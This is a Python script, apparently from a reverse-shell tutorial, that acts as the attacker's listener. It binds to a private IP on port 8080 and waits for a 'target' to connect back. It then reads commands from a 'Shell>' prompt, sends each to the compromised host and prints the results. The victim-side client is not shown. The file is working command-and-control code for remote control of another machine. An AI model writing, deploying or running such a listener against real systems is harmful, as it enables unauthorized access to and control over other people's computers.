import socket

def connect():
    s = socket.socket()
    s.bind(('192.168.232.148', 8080))
    s.listen(1) # define the backlog size for the Queue, I made it 1 as we are expecting a single connection from a single host
    conn, addr = s.accept() # accept() function will return the connection object ID (conn) and will return the client(target) IP address and
    # source port in a tuple format (IP,port)
    print ('[+] We got a connection from', addr)
​
    while True:
​
        command = input("Shell> ")
​
        if 'terminate' in command: # If we got terminate command, inform the client and close the connect and break the loop
            conn.send('terminate'.encode())
            conn.close()
            break
​
        else:
            conn.send(command.encode()) # Otherwise we will send the command to the target
            print( conn.recv(1024).decode()) # print the result that we got back
​
def main():
    connect()
main()